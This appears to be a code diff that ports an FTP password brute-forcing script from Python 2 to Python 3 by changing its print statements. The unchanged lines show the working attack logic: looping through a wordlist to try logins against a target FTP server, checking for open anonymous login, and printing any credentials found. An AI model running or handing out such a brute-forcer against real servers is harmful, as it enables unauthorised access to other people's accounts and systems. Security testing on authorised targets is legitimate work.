@@ -19,7 +19,7 @@ Example: ./ftp_brute_forcer.py -t 192.168.1.1 -u root -w /root/Desktop/wordlist.
 
 
 def help():
-    print info
+    print (info)
     sys.exit(0)
 
 
@@ -27,9 +27,9 @@ def check_anonymous_login(target):
     try:
         ftp = FTP(target)
         ftp.login()
-        print "\n[+] Anonymous login is open."
-        print "\n[+] Username : anonymous"
-        print "\n[+] Password : anonymous\n"
+        print ("\n[+] Anonymous login is open.")
+        print ("\n[+] Username : anonymous")
+        print ("\n[+] Password : anonymous\n")
         ftp.quit()
     except:
         pass
@@ -40,9 +40,9 @@ def ftp_login(target, username, password):
         ftp = FTP(target)
         ftp.login(username, password)
         ftp.quit()
-        print "\n[!] Credentials have found."
-        print "\n[!] Username : {}".format(username)
-        print "\n[!] Password : {}".format(password)
+        print ("\n[!] Credentials have found.")
+        print ("\n[!] Username : {}".format(username))
+        print ("\n[!] Password : {}".format(password))
         sys.exit(0)
     except:
         pass
@@ -57,7 +57,7 @@ def brute_force(target, username, wordlist):
             ftp_login(target, username, word)
 
     except:
-        print "\n[-] There is no such wordlist file. \n"
+        print ("\n[-] There is no such wordlist file. \n")
         sys.exit(0)
 
 
@@ -79,4 +79,4 @@ wordlist = args.wordlist
 
 brute_force(target, username, wordlist)
 check_anonymous_login(target)
-print "\n[-] Brute force finished. \n"
+print ("\n[-] Brute force finished. \n")
